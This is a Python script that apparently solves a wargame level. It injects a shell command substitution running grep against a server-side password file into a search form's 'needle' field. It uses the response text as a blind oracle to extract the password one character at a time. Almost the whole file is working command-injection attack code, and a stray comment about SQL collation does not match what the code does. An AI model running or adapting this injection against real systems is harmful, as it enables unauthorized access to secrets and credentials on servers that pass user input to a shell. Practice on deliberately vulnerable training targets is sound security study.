import string
import Auther

password = ""


def predicate(prefix: str, nextChar: str):
    # LIKE "...%" COLLATE utf8mb4_0900_as_cs
    return "African" in Auther.request(16,
                                       data={'needle':
                                             f'$(grep -E ^{prefix}{nextChar}[[:alnum:]]* {Auther.authPathOnServer(17)})'
                                             }).text


while predicate(password, '[[:alnum:]]'):
    print(f"Progress: {password.ljust(32, '*')} -> ", end="")
    chosen_chaset = string.ascii_letters
    if predicate(password, '[[:alpha:]]'):
        chosen_chaset = string.digits
    else:
        chosen_chaset = string.ascii_uppercase if predicate(
            password, '[[:upper:]]') else string.ascii_lowercase
    best = None
    for char in chosen_chaset:
        if predicate(password, char):
            best = char
            break
    if best is None:
        print("Error")
        continue
    password += char
    print(password)

print(f"Final password: {password}")
